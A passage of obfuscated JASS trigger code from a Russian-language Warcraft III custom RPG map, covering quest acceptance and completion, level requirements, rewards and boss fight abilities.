call TriggerRegisterTimerEventPeriodic(c9,2)
call TriggerAddAction(c9,function Bdc)
endfunction
function Bde takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6F636174) then
return false
endif
return true
endfunction
function Bdf takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bdg takes nothing returns nothing
local group Mc
call DisableTrigger(GetTriggeringTrigger())
call DisableTrigger(c9)
call IssuePointOrderLoc(Kp,"attackground",Location(23622.,4226.))
call TriggerSleepAction(20.)
if Bdf() then
call PauseUnit(GetTriggerUnit(),true)
call KillDestructable(HZ)
call DisplayTextToForce(GetPlayersAll(),"|c007d7d7dОтлично! Уничтожим эту нечисть!")
set V0=Location(23619.,312.)
call IssuePointOrderLoc(JT,"attack",V0)
call IssuePointOrderLoc(JS,"attack",V0)
call IssuePointOrderLoc(Jj,"attack",V0)
call RemoveLocation(V0)
set Mc=CreateGroup()
call GroupEnumUnitsInRect(Mc,Go,null)
call ForGroup(Mc,function oE)
call DestroyGroup(Mc)
set Mc=null
else
endif
endfunction
function Bdh takes nothing returns nothing
set dB=CreateTrigger()
call TriggerRegisterEnterRectSimple(dB,GS)
call TriggerAddCondition(dB,Condition(function Bde))
call TriggerAddAction(dB,function Bdg)
endfunction
function Bdi takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6F636174) then
return false
endif
if not (IsDestructableAliveBJ(HZ)==true) then
return false
endif
return true
endfunction
function Bdj takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$4F666172 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$4F746368 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$4F736864 then
return true
endif
return false
endfunction
function Bdk takes nothing returns boolean
if not Bdj() then
return false
endif
return true
endfunction
function Bdl takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$7567686F) then
return false
endif
if not (IsUnitAliveBJ(JT)==true) then
return false
endif
if not (IsUnitAliveBJ(JS)==true) then
return false
endif
if not (IsUnitAliveBJ(Jj)==true) then
return false
endif
if not (IsDestructableAliveBJ(HZ)==false) then
return false
endif
return true
endfunction
function Bdm takes nothing returns nothing
if Bdi() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Задание провалено. Мы не сможем разрушить ворота")
call DisableTrigger(c6)
call DisableTrigger(c8)
call DisableTrigger(c9)
else
endif
if Bdk() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Задание провалено. Вам никогда не заручится поддержкой орды!")
call DisableTrigger(c6)
call DisableTrigger(c8)
call DisableTrigger(c9)
call DisableTrigger(dD)
call RemoveUnit(L7)
else
endif
if Bdl() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Босс нежити повержен! Вернитесь к Минотавру
")
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Для получения особой награды герои должны находится с лагере Орды при сдаче задания")
call EnableTrigger(dD)
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("origin",Ko,"war3mapImported\\TalkToMev2.mdx")
set Us[54]=GetLastCreatedEffectBJ()
else
endif
endfunction
function Bdn takes nothing returns nothing
set dC=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(dC,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(dC,function Bdm)
endfunction
function Bdo takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6F746175) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bdp takes nothing returns boolean
if not (RectContainsUnit(GV,MT[GetForLoopIndexA()-1])==true) then
return false
endif
if not (GetUnitLevel(MT[GetForLoopIndexA()-1])==54) then
return false
endif
return true
endfunction
function Bdq takes nothing returns boolean
if not Bdp() then
return false
endif
return true
endfunction
function Bdr takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(dE)
call DisplayTextToForce(GetPlayersAll(),"|c00ff7f00Минотавр: |rмои поздравления, слуга Лен-Кура побежден. Готовы ли вы сразится с самим владыкой пустынных земель? Найдите в пустошах нашего союника |c00ffff00Шамана|r, он откроет вам проход.")
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=8
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
if Bdq() then
call SuspendHeroXPBJ(true,MT[GetForLoopIndexA()-1])
set S2[GetForLoopIndexA()]=true
call SetHeroLevel(MT[GetForLoopIndexA()-1],55,true)
set S2[GetForLoopIndexA()]=false
call SuspendHeroXPBJ(false,MT[GetForLoopIndexA()-1])
else
endif
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
call DestroyEffectBJ(Us[54])
endfunction
function Bds takes nothing returns nothing
set dD=CreateTrigger()
call DisableTrigger(dD)
call TriggerRegisterAnyUnitEventBJ(dD,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(dD,Condition(function Bdo))
call TriggerAddAction(dD,function Bdr)
endfunction
function Bdt takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6F73686D) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bdu takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Шаман: |rуверены, что хотите туда? Ну удачи!")
call AddSpecialEffectLocBJ(GetRectCenter(GY),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
call EnableTrigger(Uz)
endfunction
function Bdv takes nothing returns nothing
set dE=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(dE,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(dE,Condition(function Bdt))
call TriggerAddAction(dE,function Bdu)
endfunction
function Bdw takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bdx takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=55) then
return false
endif
return true
endfunction
function Bdy takes nothing returns nothing
local integer Mc
if Bdx() then
set V0=Location(21434.,2016.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
set Xq[777]=0
set dF[1]=93
set dF[2]=80
set dF[3]=95
set dF[4]=90
set Vz=Location(21434.,2676.)
call SetUnitPositionLoc(Lj,Vz)
call RemoveLocation(Vz)
call SetUnitInvulnerable(Lj,true)
call SetUnitOwner(Lj,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitLifePercentBJ(Lj,100)
call SaveInteger(NY,GetHandleId(Lj),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(Lj),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"|c00ff0000Для входа требуется 55 уровень")
endif
endfunction
function Bdz takes nothing returns nothing
set Uz=CreateTrigger()
call DisableTrigger(Uz)
call TriggerRegisterEnterRectSimple(Uz,GY)
call TriggerAddCondition(Uz,Condition(function Bdw))
call TriggerAddAction(Uz,function Bdy)
endfunction
function Bd0 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E636B73) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bd1 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function Bd2 takes nothing returns nothing
if Bd1() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Uq)
call DestroyEffectBJ(Us[56])
call AddSpecialEffectTargetUnitBJ("overhead",J5,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[56]=GetLastCreatedEffectBJ()
call AddSpecialEffectLocBJ(GetRectCenter(GG),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Вожак кентавров\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 45-50|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Вожак Кентавров","|c006969FFУровень задания: 45-50|r
Наш вожак совсем сошел с ума. Остановите его!","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[55]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000045|r уровня",.027,255,255,255)
endif
endfunction
function Bd3 takes nothing returns nothing
set dG=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(dG,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(dG,Condition(function Bd0))
call TriggerAddAction(dG,function Bd2)
endfunction
function Bd4 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E636B73) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bd5 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bd6 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function Bd7 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function Bd8 takes nothing returns boolean
return GetBooleanAnd(Bd6(),Bd7())
endfunction
function Bd9 takes nothing returns boolean
return GetBooleanAnd(Bd5(),Bd8())
endfunction
function BeB takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=45) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=49) then
return false
endif
return true
endfunction
function BeC takes nothing returns nothing
if BeB() then
call AddHeroXP(GetEnumUnit(),7000,false)
else
endif
endfunction
function BeD takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=45) then
return false
endif
return true
endfunction
function BeE takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function BeF takes nothing returns nothing
if BeE() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[56])
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call QuestSetCompletedBJ(YX[55],true)
call DestroyQuest(YX[55])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF7000 опыта|r, |c00ffff00400 золота|r, |c00ff969620 Кровавых Меток")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function Bd9))
call ForGroupBJ(Th,function BeC)
call DestroyGroup(Th)
set Sf=Sf+1
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BeD() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+60
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000045|r уровня",.027,255,255,255)
endif
endfunction
function BeG takes nothing returns nothing
set Ur=CreateTrigger()
call DisableTrigger(Ur)
call TriggerRegisterAnyUnitEventBJ(Ur,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Ur,Condition(function Bd4))
call TriggerAddAction(Ur,function BeF)
endfunction
function BeH takes nothing returns nothing
local location Mc
local location No
local integer Np
if GetUnitTypeId(GetOrderTargetUnit())==$656D7467 then
set Mc=GetUnitLoc(GetOrderTargetUnit())
set No=GetUnitLoc(GetTriggerUnit())
if DistanceBetweenPoints(Mc,No)<=200. then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffect(Us[57])
call DestroyQuest(YX[56])
set Sf=Sf+1
set Np=0
loop
if GetUnitLevel(MT[Np])>=39 then
set NJ[Np+1]=NJ[Np+1]+1200
set NK[Np+1]=NK[Np+1]+60
endif
if GetUnitLevel(MT[Np])>=39 and GetUnitLevel(MT[Np])<=44 then
call AddHeroXP(MT[Np],5200,false)
endif
set Np=Np+1
exitwhen Np>=8
endloop
call BJDebugMsg("|c00ff7f00Задание выполнено!|r Награда: |c00ff00ff5200|r опыта, |c00ffff00400|r золота, |c00ff969620|r Кровавых Меток")
endif
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
endif
endfunction
function BeI takes nothing returns nothing
local trigger Mc
if RectContainsUnit(Gk,GetTriggerUnit())==true then
set Xq[58]=Xq[58]+1
call RemoveRect(Gk)
if Xq[58]>=4 then
call DisableTrigger(GetTriggeringTrigger())
call BJDebugMsg("|c00ffff00Задание выполнено! Возвращайтесь!")
call DestroyEffect(Us[57])
set Us[57]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1.mdx",Ja,"overhead")
set Mc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Mc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Mc,function BeH)
else
call BJDebugMsg("|c00ffff00Вперёд к следующей точке")
endif
endif
if RectContainsUnit(Gj,GetTriggerUnit())==true then
set Xq[58]=Xq[58]+1
call RemoveRect(Gj)
if Xq[58]>=4 then
call DisableTrigger(GetTriggeringTrigger())
call BJDebugMsg("|c00ffff00Задание выполнено! Возвращайтесь!")
call DestroyEffect(Us[57])
set Us[57]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1.mdx",Ja,"overhead")
set Mc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Mc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Mc,function BeH)
else
call BJDebugMsg("|c00ffff00Вперёд к следующей точке")
endif
endif
if RectContainsUnit(Gi,GetTriggerUnit())==true then
set Xq[58]=Xq[58]+1
call RemoveRect(Gi)
if Xq[58]>=4 then
call DisableTrigger(GetTriggeringTrigger())
call BJDebugMsg("|c00ffff00Задание выполнено! Возвращайтесь!")
call DestroyEffect(Us[57])
set Us[57]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1.mdx",Ja,"overhead")
set Mc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Mc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Mc,function BeH)
else
call BJDebugMsg("|c00ffff00Вперёд к следующей точке")
endif
endif
if RectContainsUnit(Gh,GetTriggerUnit())==true then
set Xq[58]=Xq[58]+1
call RemoveRect(Gh)
if Xq[58]>=4 then
call DisableTrigger(GetTriggeringTrigger())
call BJDebugMsg("|c00ffff00Задание выполнено! Возвращайтесь!")
call DestroyEffect(Us[57])
set Us[57]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1.mdx",Ja,"overhead")
set Mc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Mc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Mc,function BeH)
else
call BJDebugMsg("|c00ffff00Вперёд к следующей точке")
endif
endif
set Mc=null
endfunction
function BeJ takes nothing returns nothing
local location Mc
local location No
local trigger Np
local string Nt
if GetUnitTypeId(GetOrderTargetUnit())==$656D7467 then
set Mc=GetUnitLoc(GetOrderTargetUnit())
set No=GetUnitLoc(GetTriggerUnit())
if DistanceBetweenPoints(Mc,No)<=200. then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
set Np=CreateTrigger()
call TriggerRegisterEnterRectSimple(Np,Gk)
call TriggerRegisterEnterRectSimple(Np,Gj)
call TriggerRegisterEnterRectSimple(Np,Gi)
call TriggerRegisterEnterRectSimple(Np,Gh)
call TriggerAddAction(Np,function BeI)
set Np=null
call DestroyEffect(Us[57])
set Us[57]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1_Portrait.mdx",Ja,"overhead")
call BJDebugMsg("|cffffcc00Задание получено:|r Каменная благодарность\n|c006969FFУровень задания: 39-44")
set Nt="|c006969FFУровень задания: 39-44|r\n\nПриветик! Поможешь? Ну конечно поможешь, куда ты денешься) Я тут задумал организовать\nодин обряд, для него мне нужно собрать некие сведения по поводу источников Мэлерота и \nкое-кого убить! Начнем со сведений. Для начала, посети такие места:\n        -Фонтан в Суральде;\n        -Фонтан в Терассе Творцов;\n        -Фонтан в Орхесте;\n        -Священный источник на Архипелаге.\n        Вперёд! Я жду."
set YX[56]=CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Каменная благодарность",Nt,"ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
endif
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
endif
endfunction
function BeK takes nothing returns nothing
set dH=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(dH,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(dH,function BeJ)
endfunction
function BeL takes nothing returns nothing
local location Mc
local location No
local integer Np
if GetUnitTypeId(GetOrderTargetUnit())==$456B6565 then
set Mc=GetUnitLoc(GetOrderTargetUnit())
set No=GetUnitLoc(GetTriggerUnit())
if DistanceBetweenPoints(Mc,No)<=200. then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbility(GetOrderTargetUnit(),$41706974)
call UnitAddAbility(GetOrderTargetUnit(),$416E6532)
call DestroyEffect(Us[58])
call DestroyQuest(YX[57])
set Sf=Sf+1
set Np=0
loop
if GetUnitLevel(MT[Np])>=17 then
set NJ[Np+1]=NJ[Np+1]+750
set NK[Np+1]=NK[Np+1]+30
endif
set Np=Np+1
exitwhen Np>=8
endloop
call BJDebugMsg("|c00ff7f00Задание выполнено!|r Награда: |c00ffff00250|r золота, |c00ff969610|r Кровавых Меток, доступ к трофеям")
endif
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
endif
endfunction
function BeM takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local trigger Mc
if GetUnitTypeId(Hu)==$6E303339 or GetUnitTypeId(Hu)==$6E303352 then
if GetUnitState(Ky,UNIT_STATE_LIFE)<1 and GetUnitState(Ld,UNIT_STATE_LIFE)<1 then
call DisableTrigger(GetTriggeringTrigger())
call BJDebugMsg("|c00ffff00Задание выполнено! Возвращайтесь!")
call DestroyEffect(Us[58])
set Us[58]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1.mdx",KH,"overhead")
set Mc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Mc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Mc,function BeL)
endif
endif
set Mc=null
set Hu=null
endfunction
function BeN takes nothing returns nothing
local location Mc
local location No
local trigger Np
local string Nt
if GetUnitTypeId(GetOrderTargetUnit())==$456B6565 then
set Mc=GetUnitLoc(GetOrderTargetUnit())
set No=GetUnitLoc(GetTriggerUnit())
if DistanceBetweenPoints(Mc,No)<=200. then
if GetUnitLevel(GetTriggerUnit())>=17 then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
set Np=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Np,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(Np,function BeM)
set Np=null
call DestroyEffect(Us[58])
set Us[58]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1_Portrait.mdx",KH,"overhead")
call BJDebugMsg("|cffffcc00Задание получено:|r Трофеи\n|c006969FFУровень задания: 17+")
set Nt="|c006969FFУровень задания: 17+|r\n\nУ каждого великого деяния должна быть соответствующая награда, согласны? Ранее, в былые \nвремена, великие воины после битвы забирали себе трофей с поля сражения, дабы он служил\nнапоминанием о победе. Так вот, убьете Люка и Каменнного Гиганта - я тоже дам вам такую\nвозможность"
set YX[57]=CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Трофеи",Nt,"ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
else
call ne(GetTriggerUnit(),"Задание с |c00ff000017|r уровня",.027,255,255,255)
endif
endif
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
endif
endfunction
function BeO takes nothing returns nothing
set dI=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(dI,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(dI,function BeN)
endfunction
function BeP takes nothing returns nothing
local location Mc
local location No
local integer Np
if GetUnitTypeId(GetOrderTargetUnit())==$6F677275 then
set Mc=GetUnitLoc(GetOrderTargetUnit())
set No=GetUnitLoc(GetTriggerUnit())
if DistanceBetweenPoints(Mc,No)<=200. then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbility(GetOrderTargetUnit(),$41706974)
call UnitAddAbility(GetOrderTargetUnit(),$416E6532)
call DestroyEffect(Us[59])
call DestroyQuest(YX[59])
set Sf=Sf+1
set Np=0
loop
if GetUnitLevel(MT[Np])>=32 then
set NJ[Np+1]=NJ[Np+1]+1200
set NK[Np+1]=NK[Np+1]+45
endif
if GetUnitLevel(MT[Np])>=32 and GetUnitLevel(MT[Np])<=39 then
call AddHeroXP(MT[Np],5500,false)
endif
set Np=Np+1
exitwhen Np>=8
endloop
call BJDebugMsg("|c00ff7f00Задание выполнено!|r Награда: |c00ff00ff5500|r опыта, |c00ffff00400|r золота, |c00ff969615|r Кровавых Меток")
endif
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
endif
endfunction
function BeQ takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local trigger Mc
if GetUnitTypeId(Hu)==$68303141 then
call DisableTrigger(GetTriggeringTrigger())
call BJDebugMsg("|c00ffff00Задание выполнено! Возвращайтесь!")
call DestroyEffect(Us[59])
set Us[59]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1.mdx",I7,"overhead")
set Mc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Mc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Mc,function BeP)
set Mc=null
endif
set Hu=null
endfunction
function BeR takes nothing returns nothing
local location Mc
local location No
local trigger Np
local string Nt
if GetUnitTypeId(GetOrderTargetUnit())==$6F677275 then
set Mc=GetUnitLoc(GetOrderTargetUnit())
set No=GetUnitLoc(GetTriggerUnit())
if DistanceBetweenPoints(Mc,No)<=200. then
if GetUnitLevel(GetTriggerUnit())>=32 then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call UnitAddAbility(GetOrderTargetUnit(),$41706974)
call UnitAddAbility(GetOrderTargetUnit(),$416E6532)
call KillDestructable(HY)
set Np=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Np,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(Np,function BeQ)
set Np=null
call DestroyEffect(Us[59])
set Us[59]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1_Portrait.mdx",I7,"overhead")
call BJDebugMsg("|cffffcc00Задание получено:|r Коа\n|c006969FFУровень задания: 32-39")
set Nt="|c006969FFУровень задания: 32-39|r\n\nНеподалёку поселился глубинный воин пучин. Задолбал уже жрать наших союзников. \nНамёк ясен? Вперёд!\nP.S. в обычном режиме боя босс просто умрёт и всё. Если хотите награду за его\nголову в виде вещей - активируйте усложнённый режим с помощью вот этой сферы,\nкоторую я могу вам продать."
set YX[59]=CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Коа",Nt,"ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
else
call ne(GetTriggerUnit(),"Задание с |c00ff000032|r уровня",.027,255,255,255)
endif
endif
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
endif
endfunction
function BeS takes nothing returns nothing
set dJ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(dJ,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(dJ,function BeR)
endfunction
function BeT takes nothing returns nothing
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Mc
local group No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=GetUnitLoc(NQ)
set No=CreateGroup()
set Np=Condition(function mv)
call GroupEnumUnitsInRangeOfLoc(No,Mc,80,Np)
call DestroyBoolExpr(Np)
set Pq=LC
set Nu=4000
call ForGroup(No,function m8)
call DestroyEffect(AddSpecialEffectLoc("Objects\\Spawnmodels\\Naga\\NagaDeath\\NagaDeath.mdl",Mc))
if CountUnitsInGroup(No)<1 then
call SetUnitState(LC,UNIT_STATE_LIFE,GetUnitState(LC,UNIT_STATE_LIFE)+150000)
call DestroyEffect(AddSpecialEffectTarget("Objects\\Spawnmodels\\Naga\\NagaDeath\\NagaDeath.mdl",LC,"chest"))
endif
call DestroyGroup(No)
set Np=null
set No=null
call RemoveLocation(Mc)
set Mc=null
else
call RemoveUnit(NQ)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set NQ=null
endfunction
function BeU takes nothing returns nothing
local location Ht=GetUnitLoc(GetEnumUnit())
local unit NQ=CreateUnitAtLoc(Player(10),$6E303157,Ht,0)
call nk(NQ,200000)
call nj(NQ,1000)
call nl(NQ,100)
call RemoveLocation(Ht)
set Ht=null
set NQ=null
endfunction
function BeV takes nothing returns nothing
local unit VB=GetTriggerUnit()
local location Mc
local group No
local boolexpr Np
if GetUnitAbilityLevel(VB,$41666165)==2 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20)
set Mc=GetUnitLoc(VB)
set No=CreateGroup()
set Np=Condition(function mv)
call GroupEnumUnitsInRect(No,Gu,Np)
call DestroyBoolExpr(Np)
call ForGroup(No,function BeU)
call DestroyGroup(No)
set Np=null
set No=null
call RemoveLocation(Mc)
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
set VB=null
endfunction
function BeW takes nothing returns nothing
local unit VB=GetTriggerUnit()
local group Mc
local boolexpr No
local location Np
local unit Nt
local timer Ny
if GetUnitAbilityLevel(VB,$41666165)==2 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(12)
call nh(VB,"|c00ff00ffИзвержение!",.028,255,255,255)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,Gu,No)
call DestroyBoolExpr(No)
set Np=GetUnitLoc(GroupPickRandomUnit(Mc))
set Nt=CreateUnitAtLoc(Player(10),$68303739,Np,0)
call AddSpecialEffectTarget("war3mapImported\\Alarm.mdx",Nt,"origin")
call DestroyGroup(Mc)
set No=null
set Mc=null
call TriggerSleepAction(2)
set Ny=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Ny),0,Nt)
call SaveInteger(Nq,GetHandleId(Ny),1,10)
call TimerStart(Ny,1,true,function BeT)
set Ny=null
set Nt=null
call EnableTrigger(GetTriggeringTrigger())
endif
set VB=null
set Np=null
endfunction
function BeX takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BeY takes nothing returns nothing
local unit VB=GetTriggerUnit()
local location Mc
local location No
local group Np
local boolexpr Nt
if GetUnitAbilityLevel(VB,$41666165)==2 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(18)
call nh(VB,"|c00ff9696Взгляд смерти!",.028,255,255,255)
call TriggerSleepAction(2)
call SetUnitInvulnerable(VB,true)
call PauseUnit(VB,true)
call TriggerSleepAction(2)
set Mc=GetUnitLoc(VB)
set No=nU(Mc,700,GetUnitFacing(VB))
set Np=CreateGroup()
set Nt=Condition(function mv)
call GroupEnumUnitsInRangeOfLoc(Np,No,700,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function BeX)
call DestroyGroup(Np)
set Nt=null
set Np=null
call DestroyEffect(AddSpecialEffectTarget("Objects\\Spawnmodels\\Undead\\UCancelDeath\\UCancelDeath.mdl",VB,"chest"))
call SetUnitInvulnerable(VB,false)
call PauseUnit(VB,false)
call EnableTrigger(GetTriggeringTrigger())
endif
set VB=null
set No=null
set Mc=null
endfunction
function BeZ takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LC,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BeY)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LC,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BeW)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LC,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BeV)
set Hc=null
endfunction
function Bea takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
set V0=GetRectCenter(GF)
call CreateNUnitsAtLoc(1,$756D7477,Player(10),V0,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(10.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(V0)
call TriggerSleepAction(10.)
